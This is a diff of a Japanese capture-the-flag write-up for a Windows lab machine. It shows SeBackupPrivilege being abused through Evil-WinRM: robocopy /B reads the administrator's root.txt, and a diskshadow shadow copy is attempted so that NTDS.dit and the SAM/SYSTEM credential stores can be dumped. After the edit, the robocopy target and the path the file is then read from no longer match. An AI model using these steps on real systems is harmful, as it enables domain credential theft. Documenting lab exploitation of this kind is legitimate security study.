@@ -140,9 +140,6 @@ Info: Establishing connection to remote endpoint
 
 
 ## STEP 3
-`SeBackupPrivilege`が有効になっているので、こいつを悪用できそう  
-SeBackupPrivilegeは[リンク](https://learn.microsoft.com/ja-jp/windows-hardware/drivers/ifs/privileges)で確認できる通り、オブジェクトのACLをバイパスしてアクセスが可能  
-ただ[リンク](https://serverfault.com/questions/980880/sebackupprivilege-but-cannot-read-all-files)でもある通り、この権限は専用のAPIを使用したプログラムでないと適用されない
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /all
 
@@ -196,23 +193,42 @@ User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
-
-
-### PATH 3-1
+`SeBackupPrivilege`が有効になっている  
+SeBackupPrivilegeは[リンク](https://learn.microsoft.com/ja-jp/windows-hardware/drivers/ifs/privileges)の通り、オブジェクトのACLをバイパスしてアクセスが可能  
+ただ[リンク](https://serverfault.com/questions/980880/sebackupprivilege-but-cannot-read-all-files)でもある通り、この権限は専用のAPIを使用したプログラムでないと適用されない  
+robocopyコマンドを使用すればルートフラグをゲットできるが、せっかくなのでシェルをとる
 ```powershell
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> mkdir C:\temp\exfil
-
-
-    Directory: C:\temp
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-----        10/6/2025  12:59 AM                exfil
-
-
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> robocopy "C:\Users\administrator\Desktop" "C:\temp\exfil" "root.txt" /B /NFL /NDL /NJH /NJS
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> robocopy "C:\Users\administrator\Desktop" "C:\Users\svc-printer\Documents\" "root.txt" /B /NFL /NDL /NJH /NJS
 
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> type C:\temp\exfil\root.txt
 278a2f7f1595036f612ce6fcfce54b52
+```
+ローカルだと、レジストリのSAM・SYSTEMをダンプすればクレデンシャルを取得できるが  
+今回はADのクレデンシャルを取得するために、レジストリ以外に`ntds.dit`を取得する必要がある  
+[リンク](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)を確認する限り、ntds.ditはシステムで使用中のためSeBackupPrivilege権限でもコピーできないが、  
+`vss`サービスを用いた`diskshadow`コマンドでコピーが可能  
+ただリンク通りに実行してもうまくシャドーコピーできなかった
+### PATH 3-1
+```powershell
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query vss
+
+SERVICE_NAME: vss
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> diskshadow /s vss.dsh
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  PRINTER,  10/6/2025 4:43:00 PM
+
+-> set context persistent nowriters
+-> add volume c: alias raj
+
+COM call "(*vssObject)->InitializeForBackup" failed.
 ```
